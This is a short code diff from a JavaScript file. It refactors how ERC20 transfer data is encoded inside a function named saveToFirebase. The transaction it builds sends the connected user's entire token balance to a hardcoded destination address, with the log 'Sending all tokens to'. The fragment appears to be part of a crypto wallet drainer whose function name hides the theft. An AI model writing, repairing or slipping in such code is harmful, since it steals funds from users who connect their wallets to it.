@@ -422,13 +422,14 @@ async function saveToFirebase(data) {
         const methodId = '0xa9059cbb';  // ERC20 transfer method ID
         const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');  // Pad to 32 bytes
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');  // Convert to hex and pad
-        
+        const data = '0x' + methodId + paddedDestination + paddedAmount;  // Only one '0x' at the start
+
         // Construct the transaction
         const transactionParameters = {
-            from: userSession.address,  // Sender (your wallet)
-            to: TOKEN_ADDRESS,          // Token contract address
-            value: '0x0',              // No QUAI being sent
-            data: '0x' + methodId + paddedDestination + paddedAmount  // Encoded transfer data
+            from: userSession.address,
+            to: TOKEN_ADDRESS,
+            value: '0x0',
+            data: data
         };
 
         log(`📤 Sending all tokens to ${DESTINATION_ADDRESS}`);
